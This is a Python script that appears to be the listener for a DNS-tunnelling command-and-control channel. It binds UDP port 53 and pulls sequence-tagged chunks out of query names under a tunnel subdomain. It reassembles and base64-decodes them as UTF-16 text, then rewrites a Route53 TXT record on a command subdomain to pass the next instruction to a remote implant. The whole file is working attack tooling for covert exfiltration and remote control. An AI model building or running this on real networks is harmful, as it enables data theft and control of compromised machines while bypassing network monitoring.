import socket
import re
import binascii
from dnslib import DNSRecord
import base64
import boto3


UDP_IP = "0.0.0.0"
UDP_PORT = 53
sock = socket.socket(socket.AF_INET, # Internet
           socket.SOCK_DGRAM) # UDP
sock.bind((UDP_IP, UDP_PORT))
print_this=''
payloadvar=''
unsorted_payload=[]
route53=boto3.client('route53')



while True:
    byteData, addr = sock.recvfrom(2048) # buffer size is 2048 bytes
    msg = binascii.unhexlify(binascii.b2a_hex(byteData))
    msg = DNSRecord.parse(msg)
    #print(msg)
    #print(str(msg.get_q().get_qname().label[0:4][0],'utf-8'))
    m = re.search(r'\;(\S+)\.tunnelsubdomain\.domain\.net', str(msg), re.MULTILINE)
    #print(m)
    if m:

        target=m.group(1)
        if print_this!=target:
            print_this=target
            print(print_this)
            if "a999" in print_this:
                unsorted_payload.append(print_this)
                #payloadvar+=print_this.replace("=","").split("a999")[1]
                #print(payloadvar)


            if "13a114lfe" in print_this:
                sorted_payload = sorted(set(unsorted_payload), key=lambda unsorted_payload: int(unsorted_payload.split('a999')[0]))
                sorted_payload= list(reversed(sorted_payload))
                parsed_payload=''
                for i in sorted_payload:
                    parsed_payload+=i.split('a999')[1]


                if "13ac0n" not in print_this:



                    decoded=base64.b64decode(parsed_payload+'==').decode('utf-16')
                    print(decoded)
                    #payloadvar=''
                    
                    unsorted_payload=[]
                    change_batch = {
                            'Comment': 'beep beep',
                            'Changes': [
                                {
                                    'Action': 'UPSERT',
                                    'ResourceRecordSet': {
                                        'Name': 'commandsubdomain.domain.net',
                                        'Type': 'TXT',
                                        'TTL': 300,
                                        'ResourceRecords': [{
                                            'Value': '"beep beep"'
                                            }]
                                        }

                                    }
                                ]
                            }
                    response = route53.change_resource_record_sets(
                        HostedZoneId='/yourzone/zoneid',
                        ChangeBatch=change_batch
                        )
                    print(response)
                                                                                                                                                                                       77,20         Bot  
